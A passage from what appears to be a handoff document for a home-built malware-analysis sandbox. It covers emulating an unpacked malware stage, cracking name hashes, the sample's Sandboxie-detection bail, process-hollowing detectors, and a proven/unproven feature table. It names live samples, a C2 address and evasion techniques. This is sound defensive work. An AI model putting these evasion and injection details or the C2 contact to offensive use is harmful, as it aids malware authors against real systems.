  works: see *The far side runs*. Start from `after_inject.state` and
  `follow_injection.py`, not from `after_scan.state`.

- **The uncracked names, cracked by reading the consuming code.** Both names
  solved so far fell to reading the call site, neither to a corpus, and each
  took minutes after days of sweeping. **Do not try a fifth wordlist** — check
  the eliminated space first (230,756 dictionary names, 28,940 generated VM
  names, every stem ≤ 7, every purely alphabetic stem of 8, 19
  prefix-constrained searches). `hash_call_sites.py --late` is the tool that
  asks the right question: what *consumes* each hash. Six of the names are the
  blocklist's own substitutions, absent from every public write-up found.
- **The crash's remaining contradiction**, still a one-bit question: the gate is
  `crc32("sbiedll.dll")`, the guest has no Sandboxie, and the guest stored the
  constant anyway. Log `0x2dc01`'s argument and return during a live run. Note
  this is *not* on the path to stage 4 — the emulator reaches a clean
  `ExitProcess` without ever taking the branch — so it settles a standing
  contradiction rather than unblocking anything.

**Run `bb51babb` added three live images of `RegSvcs`** — `t35` spawn, `t35`
exit, and the WER crash dump — where every previous run had at most one. The PE
carver found **nothing** in any of them, so they do not contain stage 4 sitting
in the open. They are still the only images of the hollowed process taken at
points the emulator has never reached, since the guest completes the injection
the emulator declines to start.

#### 3. Optional, and honestly optional

A **benign detonation** now serves only the ntdll pass, which is unscored — so
it buys information, not a decision. Note it would *not* aim gap 4's threshold
either: benign software has no VM check to be quiet after.

#### 4. When dynamic is done, the static engine is the cliff

`static_triage_engine/` is 6,419 lines producing verdicts, with **two tests**,
and until 13 Aug `pytest` did not collect them at all. `gui/` is 13,667 lines
with none. The first static task is a harness, not a feature: pin what
`score_static` currently does, then apply the `collection_available` pattern to
capa / FLOSS / YARA / VirusTotal, all of which can be silently absent. See
`docs/ROADMAP.md`.

#### Mechanics, so a cold session does not have to rediscover them

**The tools added 13 Aug**, all host-side, none needing the VM:

    ..\.venv\Scripts\python.exe verify_run.py <run-dir>       # twelve ledger rows + predictions
    ..\.venv\Scripts\python.exe benign_baseline.py --count 14 # dump-based detectors vs ordinary software
    ..\.venv\Scripts\python.exe benign_crash_baseline.py --days 180
    ..\.venv\Scripts\python.exe hash_call_sites.py --late     # what consumes each name hash
    ..\.venv\Scripts\python.exe crack_name_hashes.py --exports
    ..\.venv\Scripts\python.exe trace_blocklist.py --forward 220
    ..\.venv\Scripts\python.exe trace_poll_pass.py --which 7      # what one poll pass runs

`verify_run.py` is the one to reach for after a detonation: it distinguishes
**ABSENT from FAIL**, because a missing summary key means the guest did not pull
and an empty one means the detector found nothing, and conflating them wasted a
run once already.

`python -m dynamic_analysis.module_integrity <dir>` re-runs the hollowing check
over dumps already on disk — that is how the crash dump settled run
`d7cc5044`'s open prediction without a second detonation.

The suite is **602 fast tests in about four seconds**; `pytest` alone adds the
`slow` ones, which write a real minidump and take about ninety more. The `slow`
fixture is cached between runs and now self-invalidates when Windows servicing
overtakes it — before that guard it rotted silently for two days and produced
four failures that looked like a detector bug.


Everything runs on the host through `.venv`. The emulator lives in `scripts/`
and imports its siblings by path, so run it from that directory.

    cd scripts

    # from the entry point; ~15 min to the clean exit at 629M blocks
    ..\.venv\Scripts\python.exe emulate_native_stub.py ^
      G:\ringforge-artifacts\422e30ed_stage2\stage3_native_e84f7824.xor9 ^
      --entry 0x2680 --blocks 4000000000 --log-api

    # resume a stored state instead; seconds
    ... --load-state G:\ringforge-artifacts\422e30ed_stage2\after_scan.state

    # is a restore sound?  memory sha256 + blocks + all 16 registers
    ..\.venv\Scripts\python.exe test_emu_snapshot.py <payload> <warm60M.state>

Stored states on the artifact drive, all resumable now that `restore()` repairs
a pre-gate snapshot's ntdll copies:

| | |
|---|---|
| `warm60M.state` | ~7M blocks. The equivalence check's split point |
| `warm400M.state` | 96M blocks, **inside** the marker scan — note it is captured *within* `call 0x2cd91`, so it cannot show anything about that call's own entry |
| `after_scan.state` | 348M blocks, at the old syscall crash. `repair_wow64_crash()` picks it up automatically |

Addresses worth having, all RVAs into stage 3's relocated copy — add
`0x2001000` for the emulator, `0x1530000` for the crash dump:

| | |
|---|---|
| `0x02680` | entry point (`--entry 0x2680`) |
| `0x02c31` | the case-insensitive compare; `0x02c7c` faulted on the guest, `0x02c53` under the forged module |
| `0x02dc01` | `get_module_base_by_hash` — walks `PEB->Ldr`, lowercases, CRC-32s |
| `0x16054` | `test eax, eax` — **the gating branch** |
| `0x1605f` | `mov [esi+0x6d8], 0x32dfd514` — the store |
| `0x160a1/ab/b5/bf` | the four marker searches |
| `0x03181` | the XOR string/hash decoder (`push imm ; push key ; call`). Elsewhere in this document it appears as `0x2004181`, which is the same thing at the emulator's base — every other row here is an RVA, so mixing the two would send the next reader 32 MB off |

`RINGFORGE_FORGE_MODULE=1` adds **`sbiedll.dll`** — the real name behind
`0xe11da208`, Sandboxie's injected DLL — to the loader list and prints a line
saying so. Off by default; switching it on means *the emulated victim is
claiming to run under Sandboxie*, which is what makes stage 3 take its
detection branch and die. It supersedes `aqtd9dq.dll`, the GF(2) preimage used
while the name was unknown, which is kept in `win32_emu_env.py` only so older
logs naming it still parse.

`scripts/crack_name_hashes.py` cracks these hashes: dictionary sweep, then an
exhaustive meet-in-the-middle to a length bound, then a token-composition
search. It needs nothing but `numpy` and runs in about a minute.

    ..\.venv\Scripts\python.exe crack_name_hashes.py            # all four tiers
    ..\.venv\Scripts\python.exe crack_name_hashes.py --dict-only
    ..\.venv\Scripts\python.exe crack_name_hashes.py --exports   # +216k export names, ~2 min
    ..\.venv\Scripts\python.exe crack_name_hashes.py --hash 0x79dbe71d

`scripts/hash_call_sites.py` answers the question that should come *before*
picking a wordlist: it decodes every name hash and groups them by the function
that consumes each one, which is what says whether a hash is an export name, a
module name, or something else. **Use `--late`** — the allocation keeps
decrypting and the warmup image holds only 45 of the 65 sites, missing all 20
blocklist constants.

`scripts/trace_blocklist.py` catches the process-name comparison live. It arms
on `winenv.system_process_information` and only then installs a per-instruction
hook, which is what makes it finish: hooking from `after_scan.state` onward
would mean 48M blocks of Python callbacks. `--forward N` traces N instructions
out of the crc32 epilogue with register values, which is how the compare at
`0x2026181` was found.

**`--blocks` on the emulator is an instruction budget, not a basic-block
count**, and the two differ by about 4x. `--blocks 20000000` stops at 4.7M
blocks and reports `returned or budget reached`, which reads exactly like a
clean exit and is not one. Every block figure in this document — 17.3M for the
gated fault, 629M for the real clean exit — wants roughly four times that many
instructions. Use `--blocks 300000000` to reach the fault, `4000000000` for a
full run.

Other pieces: `python -m dynamic_analysis.module_integrity <case>\memory`
re-runs the hollowing check over dumps already on disk, no detonation needed.
`pytest -m "not slow"` is 483 tests in under two seconds; the full run writes a
real minidump and takes about a minute. The guest's 931 loaded-module names are
in `docs/guestloaded.txt`, which is what the hash sweeps should start from.

**And a warning to whoever picks this up, earned the hard way.** This section
records five inferences about the crash trigger and four of them were wrong —
a buffer overrun, `0xe11da208` twice in opposite directions, and the wow64
check. Every *measurement* held. Every step taken **between** measurements did
not. The thing that finally settled which lookup gates the branch was logging
both sides and matching them by sequence, which took one run and should have
been the first move rather than the fifth.

Gap 4 says a deliberate bail and a broken payload are indistinguishable *from
outside the guest*. From inside, with a dump and a forged preimage, they are
not: the conditionality is the discriminator, and it points at a bail.

**Why the emulator never reproduced it.** `call 0x2cd91` at `0x1606a` returns 0
every time under emulation, so it loops at `0x16014`–`0x1607a` and never reaches
`0x160ab`. That is why *every* emulated entry to the marker search arrives via
`0x2935c` and none via `0x2914e`: sampled over 900M instructions and millions of
calls, the emulator's haystack never once leaves its allocation. The harness is
keeping the sample healthier than the real machine does, which is the opposite
of the usual failure and worth remembering.

**Three retractions from getting here**, all mine, all in one afternoon:

- *"The scan overran its buffer into the guard page."* There is an unmapped gap
  immediately after the relocated image, and it is irrelevant — the faulting
  read is `0x30f1b514` past any region, not a few KB. **The dump had recorded
  the exact address the whole time** in `MINIDUMP_EXCEPTION_STREAM`; I inferred
  from layout instead of reading `ExceptionInformation[1]`.
- *"`esi` is a garbage pointer."* `esi` is a **bias** and `ecx` is the needle's
  address on the stack, so one increment walks both. The emulator's `esi` is not
  a pointer either. Registers are only interpretable against the code that uses
  them.
- *The first A/B compared the emulator's **first** entry to the search against
  the guest's **fatal** one.* This document already recorded that the search is
  re-entered against different buffers; comparing different invocations and
  calling the difference a divergence was a category error. The frame chain is
  what made them comparable.

**One method note worth keeping.** Disassembling this range from the wrong byte
produces confident nonsense — the first attempt yielded a single instruction and
stopped. The entry offset is now chosen as the one that puts **both known call
sites on instruction boundaries**, which is a self-check the bytes themselves
provide. Same failure the IL decoder had, same shape of fix.

**Parsing is proven; the finding path is not.** Across nine ProcDump images of
live malware it read 43 modules per dump with `rejected: 0` and
`resource_only: 0` — no false positives, clean parse. It has reported
`unmapped_images: 0` every time, correctly: Remcos's `smng.exe` is a normal
loader-mapped PE, so there is nothing foreign to find, and the loader sample's
payload was recovered before the carver existed.

**The premise this gap rested on now looks wrong, and the run that tested it is
the reason.** The plan was that `422e30ed…` maps its payload *alongside* the real
`RegSvcs.exe` image — the case the carver can see — so one detonation would earn
the `strong` branch. The 20:23 run of 06 Aug reported `unmapped: 0` on **every**
`RegSvcs` image: the spawn dump at t48, the exit dump at t48, the second
`RegSvcs` (pid 3420) at t51, and the WER crash dump — which
`crash_dump_preflight` confirms was written with full memory, `dump_type: 2`.
Eleven modules and about a hundred regions each.

This document wrote the failure criterion in advance: *"the carver reporting
`unmapped_images: 0` on a dump of `RegSvcs` taken after the payload was written
would mean the payload is written over the host image at its original base after
all."* The spawn dump alone could be a timing argument; the crash dump cannot,
because it was written after the fault. **Overwrite-in-place is now the
better-supported reading, and that is the documented blind spot** — the module
list is read from the memory the payload occupies, so there is nothing left to
compare against.

What keeps this a revision rather than a conclusion is that the known-module index
could in principle have suppressed a payload, and on that run ruling it out was a
*deduction*: the index suppresses only builds that another dump enumerated as
loaded, no dump enumerates either payload build, and `SmartOptimization.dll` was
reported unmapped in the root's own dump on the same run — so an identical build
inside `RegSvcs` would have been reported there too. Sound, and unreadable from the
report.

**That is now readable.** `per_dump` carries `known_module`, `resource_only`,
`inside_module` and `at_module_base` per dump, not only `unmapped` and `rejected`,
and the report lists any dump that set something aside under *What Each Dump Held*
— so "was a payload suppressed inside the hollowing target" is a column to read
rather than an argument to make. The run total is asserted equal to the sum of the
rows, so the two readings cannot drift. **The next run of this sample settles the
overwrite-in-place question directly**: `known_module: 0` on the `RegSvcs` rows
means nothing was set aside there and `unmapped: 0` is the real answer.

So the `strong` branch — `unmapped` inside a `HOLLOWING_TARGETS` process — still
has not legitimately fired, and this sample may not be able to make it fire.
`d712b6f9…` is the candidate now rather than the fallback: 1 MB .NET crypter,
vxCube reports *"unauthorized injection to a recently created process"*. The
finding path itself is not in doubt — it reported the loader's payload out of the
root process on this run, cleanly.

### Smaller

- **CLOSED — `WerFault.exe` counted as sample lineage for network attribution.**
  Correctly, in that the sample caused the crash, and misleadingly, in that
  Windows Error Reporting's `:443` is not C2. It stopped being hypothetical on
  06 Aug 21:15, when `192.0.2.123:443` landed in `sample_destinations` with
  FakeNet naming `wermgr.exe` at the same address — costing nothing only because
  443 is standard and no domain was notable. Then the same crossed wire produced
  five of nine "VM artifact reads" on 07 Aug 14:53, which is what forced the fix.
  `WINDOWS_RESPONSE_PROCESSES` in `utils` is now the single definition, and both
  passes drop those names *after* lineage resolves them and report what they
  dropped. Replayed against the 21:15 shape: WER's `:443` leaves
  `sample_destinations`, a genuine C2 on a non-standard port survives and still
  raises `unusual_ports`, and the WER requests land in `other_process_requests`
  rather than disappearing.
- `suspicious_path_hits` checks the *parent* process name against the noise
  list for non-process-create events, so a noise child under a non-noise parent
  can still surface there. Process creates were fixed; other event types were
  not reviewed.
- `background_network_processes` and the missed-descendant reconciliation are
  both exercised now — the latter recorded 3 on the 05 Aug run, where the
  sample spawned three `RegSvcs` within 15 ms and two lived less than one poll
  interval.

---

## What is proven, and what is not

The failure mode this table exists for: a feature exercised only by its own
fixtures agrees with the assumptions it was written under. The
analyzer-attribution bug is the standing proof that those can be wrong on every
run for a long time without showing.

| Feature | Status |
|---|---|
| Corroboration scoring | **Proven** across three samples and four bands — 35 / Needs Review, 70 / Elevated Attention, and 125 / Likely Malicious on Remcos with four categories and two strong. The band has moved for the right reason each time |
| Network attribution | **Proven.** `other_process_requests: 3` against the sample's own four processes, on a run where Windows was busy |
| PowerShell lineage filter | **Proven.** `blocks_from_sample: 12`, `other_process_blocks_excluded: 0` — the sample's own block survived, so the filter is not too tight |
| Split-API YARA rule | **Fires on two unrelated families, verified at the string level — 18 Aug.** It matched all five dumps of AgentTesla `31a762fd…` on run `c175a970`, a family it was not written for, and the match was checked rather than assumed: the mandatory `$resolve` string `GetDelegateForFunctionPointer` is present **ascii ×6** (0 wide — it is declared `ascii wide`, and .NET metadata strings are UTF-8, so ascii is the encoding a metadata reference to `Marshal.GetDelegateForFunctionPointer` actually has), alongside `"kernel "` ×26 and `"Virtual "` ×29 as space-suffixed UTF-16 literals. The scanned ruleset was hash-identical to the source, so this is not ruleset drift. Earlier: 0 matches across 13 live dumps totalling 976 MB and 0 of 120 genuine `Microsoft.NET` assemblies. **The rule was written against the technique rather than the family and it behaves that way** |
| Windows-response suppression | **Fixed, proven by replay on two real runs.** WER's `:443` leaves `sample_destinations` while a non-standard-port C2 in the same table survives; the 07 Aug 14:53 VM-artifact hits go 9 to 0 with 5 counted as Windows-response. One definition in `utils`, used by both passes, each reporting what it removed. Unproven on a *fresh* run |
| Sysmon highlight lineage | **Proven on a live run**, 07 Aug 14:53 — `other_process_events_excluded: 14`, `high_severity_count: 0`, no `credential_access_or_tampering`, score 70. The `dwm.exe` false positive that moved a band did not recur |
| `activity_observed` | **Proven.** `false` before the fix and `true` after, on the identical sample and chain |
| Crash-as-injection | **Proven.** Fired on the hollowed `RegSvcs`, and moved the verdict a band |
| Crash-dump collection | **Proven**, and produced the payload |
| Adaptive window | **Fired, on the wrong case** — see below |
| Received-file collection | **Root resolution proven**; `received_files.roots` named the real `tools\fakenet\defaultFiles`. The *collection* path is still unproven — nothing has been uploaded since it was written |
| Containment refusal | **Proven** on 06 Aug. Guest armed with `vm_net.ps1 -Arm`, canary launched through the Dynamic Analysis window, and the run refused: `Not contained — a default route reaches the internet through a NAT gateway (Ethernet → 10.0.2.2). The guest is ARMED. The run has not been started.` It named the adapter and gateway and blocked *before* launch. The one time this was previously at stake it failed and malware got through; this time it caught it. Tested with the benign canary, so a failure would have cost nothing |
| Spawn re-dump | **Proven as a mechanism, and it has still revealed nothing.** Fired at t11 on a child first seen at t1, on live Remcos, which drops rather than hollows. On the loader at 3s it fired **not at all**: all three children were skipped `exited before its +3s re-dump`, `RegSvcs` having lived 2.14s. The pairing it was built for was finally produced by *scheduled offsets on the root* instead — see gap 3 |
| Parent-at-spawn dump | **Proven, and its limit is now measured.** 07 Aug 04:41 it recovered an 892 KB assembly present in no other dump — the first artifact here no choice of offsets could have caught. 07 Aug 14:53 it recorded `parent exited before it could be imaged at the spawn of pid 7688` instead, because the root died inside a poll interval of spawning. Roughly half the time on this sample, and no setting changes that: the parent is alive when the child appears or it is not |
| Offsets-pending-at-exit record | **Still correctly silent**, and its sibling fired. The offsets-pending case has never had to report; the parent-exited-at-spawn record fired on 07 Aug 14:53 and is the only reason the missing stage-2 image was explicable rather than a mystery |
| `procmon_filter` in the summary | **Built, unproven.** Which filter ran, its operations, and whether reads were captured — the setting a whole pass turns on and the only capture setting that was not in the record. Read from the file, not the filename |
| PE carve | **Recovered a real payload** — `SmartOptimization.dll`, a VB.NET assembly with forged Microsoft branding, from the loader's own process. Its `strong` classification on that run was a **false positive**: six copies of ntdll a suspended process had not yet enumerated. Fixed with the known-module index; the fix is unproven |
| Known-module index | **Proven twice.** 06 Aug 15:55 — `known_module_images: 6`, `unmapped_images: 1`, `unmapped_in_hollowing_target: 0`, verdict unchanged at 70 — and again at 20:23 on a two-`RegSvcs` chain with 9 reclassified. The ntdll false positive has not recurred, and the payload was reported both times |
| Multi-region carve | **Fixed, still unproven.** `regions_spanned: 1` again on 06 Aug 20:23. Two runs now with nothing spanning ranges, so it has never engaged; it correctly declined to bridge a gap |
| File-versus-mapped layout | **Proven** on 06 Aug 20:23 — the recovered payload reported `layout: "file"`, `truncated: false`. Held in file layout, measured against file layout, reported complete. Before the fix every such payload reported itself truncated against `SizeOfImage`, which is the mapped footprint |
| Dropped-file lineage | **Fixed, unproven.** Had none at all: a browser's writes counted as the sample's and took `payload_dropped` to strong on a loader that drops nothing |
| Carve on long paths | **Fixed, unproven.** A hash-named sample produced a 264-character path and the carve failed silently on the best image of the run |
| Crash-dump `hollowing_target` | **Fixed, still unproven.** The 06 Aug 20:23 crash dump carried no unmapped image at all, so there was nothing for it to classify. The bare WER stem used to lose the `.exe`, scoring crash-dump images `present` where live-dump images scored `strong` |
| File writes / dropped files | **Proven** on 06 Aug — 12 write events and the `%APPDATA%` drop, after being 0 on every run ever performed |
| `external_contact` on a bare IP | **Proven.** Fired strong on `62.60.226.68:24042` with no DNS lookup at all |
| Lineage on writes / paths / persistence | **Proven** on 06 Aug — persistence 14 → 2, Windows Update out of `top_written_paths`, exclusions counted |
| Dropped-file probe filtering | **Proven.** 13 candidates → 1, and that one exists on disk |
| Open-versus-production on file events | **Proven** on 06 Aug, 13:47. Every predicted number landed: hits 42 → 26, DLL probes 9 → 0, `svchost` opens 7 → 0, `file_write_events` 0 → 2 naming the drop |
| Sysmon Event 25 | **Enabled and silent.** Does not catch this technique; may catch others |
| Chain-crashed warning (gap 4) | **Proven on a live run**, 06 Aug 20:23 — both witnesses agreed, the card rendered above the verdict naming `RegSvcs.exe (pid 4264)`. The run also exposed `werfault_pid` reporting the crashed PID rather than WerFault's, now fixed; `chain_crashed` and `crashed_pid` were never wrong |
| Registry-read collection (gap 4b) | **Proven end to end**, 07 Aug 14:53. Procmon accepted the generated `.pmc` (`registry_read: 143,805`), lineage resolved, and the pass produced hits. Volume measured at 2.2x events for 281s total — no teardown blowup. Its first exposure to real data found the false-positive class it needed to: nine hits, all Windows, now suppressed and counted |
| `.pmc` filter rewrite | **Round-trip byte-exact** on `dynamic_default.pmc`, and the generated config re-parses. That the *format model* is right is well evidenced; that **Procmon loads it** is not tested and cannot be on the host. Check the run's `Operation` values before trusting an empty result |
| IL decoder completeness | **Proven structurally**, 09 Aug — 0 undecoded bytes across 61,113 instructions in all 3,697 bodies. This is the right shape of check: an incomplete opcode table cannot reach zero, because an unrecognised opcode's operand decodes to further unrecognised bytes. Before the fix it was silently wrong on every flattened method and nothing said so |
| Proxy-aware call graph | **Proven on the artefact it was built for.** 1,181 of 1,181 bindings have a consumer, and it produced the payload decryptor from a standing start. Unproven on any *other* protected sample — the map locator is generic, but nothing else has been run through it |
| Stage-2 payload decryption | **Proven by the plaintext.** `PE\0\0` at the `e_lfanew` the header itself declares, a coherent section table, and 3.5 KB of header padding decrypting to entropy 0.000. Key recovered algebraically, not searched |
| Native stub emulation | **Drives a no-import stub; has not yet produced a payload.** Carries stage 3 through PEB walk, name resolution, `NtAllocateVirtualMemory`, self-relocation and RC4 decryption that runs to completion. It was twice called a stall and is not one. Do not trust a buffer-watching progress check here — two versions of it gave false answers, the second while being capable of failing, because it watched the allocation while the output went to the stack |
| Syscall-boundary interception | **Proven end to end**, 10 Aug. The gate fires on a payload calling stubs out of its *own* mapped ntdll, where an export hook sees nothing: four syscalls dispatched by service number into the handlers that already existed. Proven on both paths — resumed from `after_scan.state`, and from a cold run whose call sequence matches it exactly, which is what says `setup()` installs the gate and not only `restore()` |
| SSN table completeness | **Proven structurally.** 509 numbers, `0x0`–`0x1fc`, unique and contiguous. This is the right shape of check: a kernel service table has no gaps, so a gap means an unrecognised stub shape rather than a missing service — and it found one on its first run, the dual-path `NtQueryInformationProcess`. Same reasoning as counting the bytes the IL decoder could not name |
| Emulator snapshot / restore | **Proven by equivalence**, and now across a format change. `test_emu_snapshot.py` reports `EQUIVALENT` on memory SHA-256, block count and all sixteen registers — reading a **v1 snapshot written by the older code** into the newer emulator, so backward compatibility is demonstrated rather than assumed. A v2 round trip matches on memory, blocks and EIP |
| Module integrity | **PROVEN on a real hollow — run `677547d9`, 18 Aug.** Dridex `e30b76f9…` mapped a 102,400-byte image over its own 180,224-byte file at base `0x400000`; `header_mismatch` fired **10 times** across the dumps, on identity (`TimeDateStamp` + `SizeOfImage`) rather than degree — the exact case the false-negative fix was made for. `modules_compared: 314`, `identical: 314`. **This is the route that covers the carver's overwrite-in-place blind spot, and the same run confirmed that blind spot live (`unmapped_images: 0`).** Not `strong`, because the hollowed host was the sample's own copy rather than a member of `HOLLOWING_TARGETS`. Earlier: run `3f70058b` compared 568 modules across 11 dumps — 560 identical, 8 patched, 0 replaced — with the object that mattered, a second `RegSvcs.exe` at `0x400000`, falling into an unnamed `no_reference`; `header_mismatch` and named skips were the fix. **`no_reference` at `0x400000` recurred on `677547d9`'s two parent dumps** while the child dumps graded `header_mismatch`, so that distinction is still worth one look. `replaced` has never been seen in the wild |
| Test suite runnable at all | **Fixed.** pytest was installed in neither interpreter, and collection died on two CLI tools in `scripts/` named `test_*.py`. 492 pass; `pytest -m "not slow"` is 483 in 1.6s. The handoff's "332 tests" was stale by 160 |
| Served process list | **Built, and it moved the sample** -- past the enumeration into `NtOpenDirectoryObject`, `NtCreateMutant` and a 20-entry anti-analysis name check. It is the one **invented** input in the harness, declared in `winenv.PROCESS_LIST` and named in every run's output, so anything concluded after it is conditional on those twelve names |
| Remote-write capture | **Built, never fired.** `NtWriteVirtualMemory`, `NtOpenProcess`, `NtCreateSection`/`NtMapViewOfSection` are instrumented and section views are real allocations so a payload copied in with ordinary instructions is still visible -- but the sample exits before injecting, so none of it has run. Do not read the empty section as evidence the sample does not inject; the decoded capability set says otherwise |
| Harness-supplied `Wow64Transition` | **Retracted as unnecessary, by measurement.** The harness fills the loaded image's slot and `fs:[0xC0]` — the loader's job — and nothing else. Filling private copies was an invention and is gone from the live path: the payload does that fixup itself at `0x202f457`, reading the loaded slot and writing its own, and a full run with the fill disabled reaches the identical endpoint. It survives only inside `repair_wow64_crash()`, to unstick a snapshot that recorded the harness's old zero |

Still worth disbelieving: the adaptive window needs the memory dump watcher for
its activity probe. A run that is not elevated has no probe and the window
silently stays fixed — recorded as `adaptive_available: false`, which is the
field to check rather than assuming extension was available.

### The adaptive window is more expensive than it looks

The UPX control fired it: `mimikatz.upx.exe` sits at its interactive prompt, so
it is alive and childless forever, which the probe cannot tell from a crypter
asleep. 14 extensions, `extension_cap_reached` at 600s.

That run took **1148 seconds** against 271 and 282 for the two 180s runs before
it. Only 600 of that is the window; teardown was 548, because Procmon captured
**113,367 events** against ~41–50k, and all of them get parsed.

The time is the smaller cost. **Some of the pipeline's attribution is bounded
by the window rather than by lineage, and lengthening the window is free for the
first kind and corrosive to the second:** Windows scheduled maintenance fired
four minutes in and put seven LOLBins into the sample's Spawned Processes, and
Windows Troubleshooting ran PowerShell, raising a false `scripted_execution`
category. The second of those is fixed; the first is correct policy and simply
noisier on a long run.

Both control READMEs now say to untick *Extend if dormant* — neither sample can
benefit and both are resident by construction. The probe still cannot tell
"waiting at a prompt" from "asleep before unpacking", and there is no cheap
signal that does: both are alive, quiet and childless.

**The cap stays at 600s.** It was briefly dropped to 300 and put back, because
lowering it is the wrong lever: the cap is *total* observation, not extra, so
300 buys four extension steps and cannot outlast the five-minute sleep the
feature exists for. It penalises the samples this is meant to catch without
helping the resident case at all.

After the PowerShell fix, the only *scored* input that still scales with window
length is the persistence diff, and it held clean across a ten-minute run with a
full round of Windows idle maintenance in it. LOLBin counts and Procmon volume
feed only the context score, which is capped at 15, so they degrade the report
rather than the verdict.

---

## Conventions worth keeping

These are why this session's bugs were findable, and they are load-bearing.

**Silence must be distinguishable from absence.** Every filter that removes
something records that it did: `analyzer_events_excluded`,
`os_baseline_events_excluded`, `noise_dns_excluded`, `background_processes`,
`missed_descendants`, `other_process_blocks_excluded`, `skipped` dumps with
reasons. A report that says nothing happened and a report that could not tell
must never look alike.

**Attribute by lineage or by requesting process, never by maintaining a list of
everything else.** Name lists exist only as suppression aids that run *before*
attribution. This rule was broken three times in one day — network evidence,
PowerShell blocks, and the process-name set feeding network attribution — and
each break looked correct until a run made it visible.

**A fourth instance, and the one that shows why a list can never be the
attribution.** The Sysmon highlight pass tested three suppression lists and
treated everything falling through them as the sample's. One of those lists holds
`dwm.exe -> csrss.exe` precisely because Windows compositing raises
`CreateRemoteThread` — and on 07 Aug Sysmon could not resolve the target image, so
the pair was `("dwm.exe", "")`, the allowlist could not match, and the Desktop
Window Manager carried a category that moved the verdict a band. **An unresolved
field defeats a name list, and no amount of extending it fixes that.** Lineage
does not care what the fields say.

**A control that only writes to a log is documentation.** The containment check
once emitted `CONTAINMENT WARNING` and launched the sample anyway. It now refuses
the run — proven 06 Aug by arming the guest and watching it block a launch
before it started (see the proven table). Test your controls deliberately, and
test them with something that costs nothing when they fail: the armed detonation
that first exposed this was live malware, the run that proved the fix was the
benign canary.

**Check the behaviour, not the text.** A config file containing
`ProcessTampering` in a comment satisfied a text search while the live config
had it disabled. `sysmon64.exe -c` dumping the running configuration is the real
test, and the same shape of mistake appeared three times on 05 Aug.

**A control's contract is directional.** The UPX control says "anything less
means the dump or the delta logic is at fault." More is fine.

**A substring list is not a regex, and nothing will tell you.** 46 markers
across four modules were written with regex-style doubled separators and matched
with a plain `in` test, so they matched nothing for the life of the project. It
cost every file write and every file create on every run, and 332 tests passed
over it, because no test ever asserted a real path against them. When a detector
is a list of literals, test it with a string that must match — not with the
constants, which are the thing that is wrong. And when one instance turns up,
**sweep for the rest**: the first fix here was incomplete and would have looked
like a failed re-run rather than a partial fix.

**An operation name is not what the operation did.** Procmon's `CreateFile`
covers opening an existing file, and on one run 37 of 38 file events were
`Disposition: Open` while exactly one wrote anything. The detail field carries
the answer; the operation name does not. The same holds for the result — an
event that failed with "not found" observed an absence, and an absence is not
evidence of anything.

**Give every new pass the lineage the old ones have.** Findings, PowerShell
blocks and network records each got lineage attribution after a run proved they
needed it. Dropped files never did, and nobody noticed until a browser's writes
took `payload_dropped` to strong on a sample that drops nothing. When adding a
pass over the same events, the question is not whether it needs attribution —
it is which of the existing passes to copy.

**A path keyword says what happened, never who did it.** Every list of
suspicious paths is a statement about a *kind* of event, and the OS touches its
own autostart surfaces, task folders and service keys constantly. Attribution is
a separate question and has to be asked separately — but not of everything: a
payload written into a user-writable directory is a finding whoever produced it,
because a sample can cause a write it does not perform. Gate the surfaces, keep
the payloads.

**Repair a suppression list in the same change as the detector it guards.**
Every module with dead detection markers had dead exclusion markers too. A live
detector against a dead exclusion list is worse than both being dead, because
the analyzer writes thousands of files into the directory it is watching.

**Lineage says a process is in the tree; it cannot say the behaviour is the
malware's.** `WerFault` is in the sample's tree because the sample's crash put it there,
and Error Reporting then reads machine identity for its report and tries to upload it.
Attributed by lineage that is a VM check and a C2 contact; both are Windows reacting.
The same is true of anything the OS starts *in response to* the sample — WER, the
indexer noticing a dropped file, a troubleshooter firing after a crash. Lineage remains
the right primitive, and a short list of Windows-response processes belongs in front of
it, counted rather than dropped. One definition, in `utils`, because the VM-artifact pass
and the network attribution both need it and neither imports the other — the sibling-module
rule applied *before* the second instance cost anything, for once.

**A reimplemented PRNG validated on its first output has not been validated.** The
proxy map's keystream starts from a zero state, and `state * state % modulus` is zero
whatever the modulus is — so the first output word was correct while the modulus was
wrong, and only word two diverged. The first token decrypted to a valid Field token and
looked like success. Check a stream cipher against *several* outputs, or against a
structural property of the whole plaintext: "all 1,181 keys are Field tokens" is the
assertion that actually settled it, and it is in `scripts/dotnet_meta.py` as a
pass/fail line rather than left to whoever runs it next.

**An API name in an image is not a statement about the artefact in front of you.**
`na3PRqPuA2` was called AES for two days because an `AesCryptoServiceProvider`
string sat near it and its length divided by 16. Neither is evidence: the string
belongs to the protector's string layer in a different type, and any even buffer
divides by a block size. The rebuilt call graph settled it in one query — the image
holds exactly two decryptors and **neither is reachable from the payload path** — and
the real cipher turned out to be hand-rolled IL with no crypto API at all. *Ask what
reaches the artefact, not what the binary happens to contain.* The same query is the
cheap version of the standing rule about reading one method body before running one
brute force: 792 combinations were spent on the wrong algorithm, not merely the
wrong key.

**Invert the cipher before searching its key space.** The payload cipher subtracts
the *next, still-encrypted* byte, which means it inverts against known plaintext:
one line of algebra over a stock MZ stub returned the key directly, and returned it
*checkable* — printable ASCII repeating with period 10, which a wrong answer is not.
No brute force was run at all. When a routine is short enough to read, read it for a
relation between plaintext and key before treating the key as something to look for.

**A decoder's completeness is testable without knowing what it should say.** The IL
decoder was missing every comparison branch and `endfinally`, so it desynchronised
on precisely the control-flow-flattened methods that mattered, and produced
confident-looking garbage. The check that fixed it needs no ground truth: *count the
bytes the decoder could not name*. Zero across 61,113 instructions is only reachable
if the table is complete, because an unknown opcode's operand decodes to more
unknowns. The two-byte table already carried a comment naming this exact failure;
the one-byte table beside it had the same hole. **When a comment warns about a
failure mode, check the sibling structure for it in the same change.**

**A literal that looks like a key may be there to be guessed at.** Ten
random-looking 16-to-21 character strings sat beside an AES call in the 892 KB stage,
and about 4,000 key derivations were tried against them before the IL showed what they
are for: `ldstr` the literal, `String.get_Length`, `ret`. They are loaded so their
lengths can be taken and discarded. The real key was a byte-array literal initialised
through `RuntimeHelpers::InitializeArray` from `FieldRVA` data, which is where a .NET
key normally lives and which no amount of string guessing reaches. **Read one method
body before running one brute force** — the method body is cheaper and it is the only
thing that answers the question.

**Carve the image, then read it off the box.** The point of recovering a payload
is what static analysis then says about it, and that lives on the host, not in
another detonation. The 07 Aug stage 2 is the strongest instance: `pefile` on the
host produced the forged vendor, the decoy application, the split-fragment
injection API set, the AES resource and its exact block structure — and retracted
two conclusions this document had been asserting, one of which was "there is
nothing more this sample yields". A carved artifact is a question answered on the
